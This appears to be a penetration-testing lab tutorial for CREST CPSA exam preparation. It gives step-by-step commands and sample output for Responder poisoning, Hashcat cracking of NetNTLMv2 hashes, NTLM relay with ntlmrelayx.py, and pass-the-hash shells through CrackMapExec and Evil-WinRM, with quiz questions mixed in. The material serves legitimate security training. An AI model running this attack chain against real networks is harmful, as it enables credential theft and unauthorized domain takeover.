Understanding the Attack: LLMNR and NBT-NS Poisoning

Theory

When a Windows host cannot resolve a hostname via DNS, it falls back to LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) - both broadcast protocols. Any host on the local network can respond to these broadcasts, claiming to be the requested hostname. When the victim authenticates to the fake host, it sends a NetNTLMv2 hash.

Responder poisons these broadcasts and captures the authentication attempts:

# How the attack flows:
# 1. Victim types \\FINANCE-SERVER\ in Explorer (host does not exist)
# 2. DNS lookup fails
# 3. Victim broadcasts LLMNR/NBT-NS query: "Who is FINANCE-SERVER?"
# 4. Responder answers: "I am FINANCE-SERVER, authenticate to me"
# 5. Victim sends NetNTLMv2 hash to Responder
# 6. Responder captures and logs the hash
★
CREST CPSA Exam Point: Know the difference between what you can do with a NetNTLMv2 hash vs an NT hash. NetNTLMv2 must be cracked offline or relayed - it cannot be passed directly. NT hashes (from Mimikatz/secretsdump) can be passed directly using PTH. This distinction appears in CPSA examination questions.

Capturing Hashes with Responder

Responder

First, identify your network interface (eth0, ens33, or similar):

ip a
# Note the interface connected to the 10.x.x.x or 192.168.x.x network

Start Responder in analysis mode first to passively observe traffic without poisoning - useful for scoping and identifying targets before going active:

# Analysis mode (passive - observe only, do not poison)
responder -I eth0 -A

When ready to capture hashes, run in active mode:

# Active poisoning mode - captures NetNTLMv2 hashes
responder -I eth0 -rdwv

Expected output when a hash is captured:

[SMB] NTLMv2-SSP Client   : <DC01-IP>
[SMB] NTLMv2-SSP Username : SYNTEX\jsmith
[SMB] NTLMv2-SSP Hash     : jsmith::SYNTEX:1122334455667788:A1B2C3D4E5F6...
[SMB] NTLMv2-SSP Hash     : (full hash written to /usr/share/responder/logs/)

Responder logs all captured hashes. Find them here:

ls /usr/share/responder/logs/
# Look for: SMB-NTLMv2-SSP-<IP>.txt
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt
⚠
Lab Note: In the Syntex lab, you may need to trigger a name resolution failure manually to generate traffic for Responder. From a Windows workstation on the same segment, attempt to access a non-existent UNC path: \\DOESNOTEXIST\share. The DC itself also makes periodic network requests that Responder can intercept. Give it 2-3 minutes on an active network.

Cracking the NetNTLMv2 Hash with Hashcat

Hashcat

Copy the full hash from the Responder log. The hash format for NetNTLMv2 is Hashcat mode 5600. Use the rockyou wordlist:

# Save the hash to a file
echo 'jsmith::SYNTEX:1122334455667788:A1B2...' > hash.txt

# Crack with Hashcat mode 5600 (NetNTLMv2)
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force

# If successful:
jsmith::SYNTEX:1122334455667788:...:[HASH]:Welcome1

Session..........: hashcat
Status...........: Cracked

Show cracked hashes at any time with:

hashcat -m 5600 hash.txt --show
★
CREST CPSA Exam Point: Hashcat mode numbers for Windows attacks - memorise these:
5600 - NetNTLMv2 (Responder capture)
13100 - Kerberoasting (TGS ticket)
18200 - AS-REP Roasting
1000 - NT hash (from NTDS.dit or Mimikatz)

NTLM Relay Attack with ntlmrelayx.py

Impacket

Since SMB signing is not required on SYNTEX-DC01, you can relay the captured hash directly instead of cracking it. This bypasses password complexity. Run Responder with SMB and HTTP servers disabled (to avoid capturing instead of relaying), then run ntlmrelayx.py targeting the DC:

# Terminal 1: Run Responder with SMB and HTTP off
responder -I eth0 -rdw --disable-ess
# Edit /etc/responder/Responder.conf: set SMB = Off, HTTP = Off

# Terminal 2: Run ntlmrelayx targeting the DC
ntlmrelayx.py -t smb://<DC01-IP> -smb2support

If a user authentication is relayed successfully, ntlmrelayx.py will dump the SAM database automatically:

[*] Authenticating against smb://<DC01-IP> as SYNTEX/jsmith SUCCEED
[*] Service RemoteRegistry is in stopped state
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8a4bbc2b9f3a4c3a1234567890abcdef:::
syntex-admin:1000:aad3b435b51404eeaad3b435b51404ee:e5d80cc6f0f1456fa3baef22e5b89f12:::
ℹ
Relay vs Crack: When SMB signing is disabled, relay is always preferable to cracking - it is immediate, requires no wordlist, and works regardless of password complexity. Only fall back to cracking when all targets enforce signing.
5

Pass-the-Hash to Gain Shell Access

PTH + Evil-WinRM

If you obtained an NT hash (via relay, Mimikatz, or secretsdump), you can authenticate as that user without knowing the plaintext password. The Syntex DC has LocalAccountTokenFilterPolicy = 1 and WinRM Basic Auth enabled - both required for PTH to succeed with local accounts.

First, verify PTH works with CrackMapExec:

# Pass-the-Hash via SMB - [+] = success, (Pwn3d!) = admin
crackmapexec smb <DC01-IP> -u Administrator -H 8a4bbc2b9f3a4c3a1234567890abcdef

SMB  <DC01-IP>  445  SYNTEX-DC01  [+] SYNTEX\Administrator:8a4bbc2b... (Pwn3d!)

Get an interactive shell using Evil-WinRM with the NT hash:

# Evil-WinRM Pass-the-Hash - interactive PowerShell session
evil-winrm -i <DC01-IP> -u Administrator -H 8a4bbc2b9f3a4c3a1234567890abcdef

Evil-WinRM shell v3.x
*Evil-WinRM* PS C:\Users\Administrator\Documents>

# Verify who you are and what privileges you have
whoami
whoami /priv
whoami /groups

If you cracked jsmith's password (Welcome1) rather than obtaining an NT hash, use the plaintext credential directly:

# Plaintext credential authentication (no hash needed)
evil-winrm -i <DC01-IP> -u jsmith -p Welcome1
★
CREST CPSA Exam Point: Pass-the-Hash uses the NT hash component only. The LM hash component (shown as aad3b435b51404eeaad3b435b51404ee) is always the same empty-LM-hash value in modern Windows - it is not the actual LM hash. Pass only the NT hash (second value after the colon) to PTH tools.

Knowledge Check

Q1. You capture a NetNTLMv2 hash with Responder. SMB signing is disabled on the target. What is the most efficient next step?

A. Crack it with Hashcat mode 5600
B. Relay it with ntlmrelayx.py directly to the target
C. Pass it using Evil-WinRM with the -H flag
D. Use it with Mimikatz pass-the-hash

Q2. What is the correct Hashcat mode for cracking a Kerberoasting ticket? And for AS-REP Roasting?

Kerberoasting: mode 13100 (Kerberos 5, etype 23 TGS-REP). AS-REP Roasting: mode 18200 (Kerberos 5 AS-REP etype 23). Both use offline cracking with a wordlist. The key operational difference: Kerberoasting requires domain credentials to request tickets; AS-REP Roasting does not require authentication at all.

Q3. What must be true about the target host for Pass-the-Hash to work with a local Administrator account?

A. SMB signing must be disabled
B. LocalAccountTokenFilterPolicy must be set to 1
C. NTLMv1 must be enabled
D. The account must be in Domain Admins

Key Takeaways

  • LLMNR/NBT-NS poisoning works because Windows broadcasts name resolution queries to the whole subnet
  • Responder captures NetNTLMv2 hashes - relay when signing is off, crack when signing is enforced
  • NetNTLMv2 = crack (mode 5600) or relay. NT hash = pass directly with -H flag
  • LocalAccountTokenFilterPolicy=1 on SYNTEX-DC01 enables PTH for local accounts over the network
  • Evil-WinRM is the cleanest way to get an interactive shell via PTH on WinRM-enabled hosts
